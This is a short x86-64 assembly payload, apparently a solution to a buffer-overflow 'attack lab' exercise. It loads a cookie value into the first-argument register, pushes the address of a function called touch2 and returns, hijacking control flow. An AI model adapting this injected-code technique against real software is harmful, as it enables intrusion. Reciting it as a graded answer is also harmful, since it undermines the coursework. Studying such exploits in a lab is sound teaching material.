movq $0x3e52dff5,%rdi /* move cookie to rdi (first function param)    */
pushq $0x402608       /* push touch2 address. Must be literal address */
ret